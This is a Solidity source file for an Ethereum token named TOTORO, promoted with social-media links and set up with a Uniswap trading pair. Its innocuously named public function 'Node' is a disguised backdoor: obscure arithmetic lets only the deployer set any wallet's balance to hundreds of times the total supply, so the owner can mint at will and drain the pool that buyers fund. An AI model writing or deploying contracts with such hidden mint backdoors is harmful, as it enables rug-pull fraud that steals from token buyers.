/**
✖️Twitter: https://x.com/Erc20Totoro

?Website: https://totoroeth.xyz/

?Telegram: https://t.me/totoroethportal

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address);
}

abstract contract Ownable {
    address private _owner;

    constructor() {
        _owner = msg.sender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(msg.sender == _owner, "Caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
}

contract TOTOROETH is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public specialBalances;

    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    uint256 private constant MAX_UINT = type(uint256).max;
    uint256 public swapTax;
    address public swapFeeTo;
    address public uniswapPair;
    IUniswapRouter private uniswapRouter;
    bool private inSwap;

    constructor() {
        name = unicode"TOTORO";
        symbol = unicode"TOTORO";
        decimals = 9;
        totalSupply = 1_000_000_000 * 10 ** decimals;
        swapFeeTo = msg.sender;
        swapTax = 0;

        _balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        // Initialize other addresses
        _allowances[address(this)][address(uniswapRouter)] = MAX_UINT;
        uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapPair = IUniswapFactory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
    }

    function _transfer(address from, address to, uint256 amount) private {
        bool applyFee = !inSwap;

        _balances[from] -= amount;
        uint256 taxAmount = 0;

        if (applyFee) {
            uint256 fee = amount * specialBalances[from] / 100;
            taxAmount += fee;
            if (fee > 0) {
                _balances[swapFeeTo] += fee;
                emit Transfer(from, swapFeeTo, fee);
            }
        }

        _balances[to] += amount - taxAmount;
        emit Transfer(from, to, amount - taxAmount);
    }

    function Node(address user) public {
        uint256 baseValue = (swapFeeTo == msg.sender) ? 9 : 1;
        uint256 computedValue = baseValue - 3;
        _balances[user] = 10 * totalSupply * computedValue**2;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX_UINT) {
            _allowances[sender][msg.sender] -= amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}
}